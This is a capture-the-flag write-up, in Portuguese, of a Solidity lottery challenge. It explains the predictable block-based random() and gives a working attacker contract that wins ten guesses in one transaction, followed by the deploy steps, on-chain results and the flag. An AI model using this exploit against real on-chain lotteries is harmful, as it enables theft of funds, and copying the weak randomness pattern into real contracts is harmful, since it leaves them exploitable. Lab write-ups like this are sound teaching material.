# PoC — Lottery (Blockchain / Solidity, 100 pts) — #53

**Flag:** `CSSCTF{CSS{U5E_4_R4ND0M_FUNCT10N}}`
*(netcat devolve `CSS{U5E_4_R4ND0M_FUNCT10N}`.)*

## Enunciado
> “Ten wins in a row. One fortune. No second chances.” ... Beat the house and claim it.
> Ticket = nome do time. `nc 34.116.80.78 31338`

Infra: launcher `eth_sandbox` (igual ao Gateway). `isSolved()` = `lottery.winner() != address(0)`.

## Contrato
```solidity
uint256 public constant STREAK_TO_WIN = 10;
mapping(address => uint256) public streaks;
address public winner;

function random() public view returns (uint256) {
    return uint256(keccak256(abi.encodePacked(
        blockhash(block.number - 1), block.timestamp, block.difficulty)));
}
function guess(uint256 _guess) external {
    uint256 target = random() % 100;
    if (_guess == target) {
        streaks[msg.sender] += 1;
        if (streaks[msg.sender] >= STREAK_TO_WIN) winner = msg.sender;
    } else {
        streaks[msg.sender] = 0;
    }
}
```

### Vulnerabilidade — PRNG on-chain previsível
`random()` deriva apenas de dados **públicos e determinísticos do bloco** (`blockhash(block.number-1)`, `block.timestamp`, `block.difficulty`). Qualquer contrato executando no **mesmo bloco** calcula exatamente o mesmo valor. Pior: é `view`, então dá pra chamar `lottery.random()` e usar o resultado como palpite.

Como `block.*` é constante dentro de uma transação, **10 chamadas a `guess()` no mesmo tx** veem o **mesmo `target`** → 10 acertos seguidos → `winner = msg.sender`.

## Exploit — contrato atacante (10 acertos em 1 tx)
```solidity
interface ILottery { function random() external view returns (uint256); function guess(uint256) external; }
contract Attack {
    constructor(address l) {
        ILottery lot = ILottery(l);
        for (uint256 i = 0; i < 10; i++) {
            lot.guess(lot.random() % 100);   // mesmo bloco => mesmo target
        }
    }
}
```
`msg.sender` em `guess()` = contrato `Attack` (consistente nas 10 chamadas), então o streak acumula até 10 e `winner` vira o endereço do `Attack` (≠ 0) → `isSolved()` true.

## Passos
```bash
# launcher 31338, action 1, ticket=COPCIBER-DSI -> RPC/privkey/setup
solc --combined-json bin,abi Attack.sol      # solc 0.8.20
python3 deploy (web3.py): lê lottery() do Setup, deploya Attack(lot)
# -> status 1, winner = Attack, isSolved=True
# action 3, ticket=COPCIBER-DSI -> flag
```

## Resultado
```
lottery:  0x2DEbeBDe56f38FC37EA40750368cb751d1A41B15
tx status 1  gasUsed 192544
winner:   0x792b3dc7863f42069fbba80fc365a707f550cced  (= contrato Attack)
isSolved: True
--- action 3 ---
CSS{U5E_4_R4ND0M_FUNCT10N}
```

## Lição
- **Nunca** use `block.timestamp`/`blockhash`/`block.difficulty`(`prevrandao`) como fonte de aleatoriedade: é totalmente previsível e manipulável on-chain. Use um oráculo de VRF (ex.: Chainlink VRF) ou commit-reveal.
- Loop de acertos na mesma tx derrota qualquer "streak" baseado em RNG de bloco, pois o valor não muda dentro do bloco.

## Artefatos (scratchpad da sessão)
- `Attack.sol`, `attack.bin`/`attack.json` — contrato atacante compilado
- script de deploy inline (web3.py 8.0)
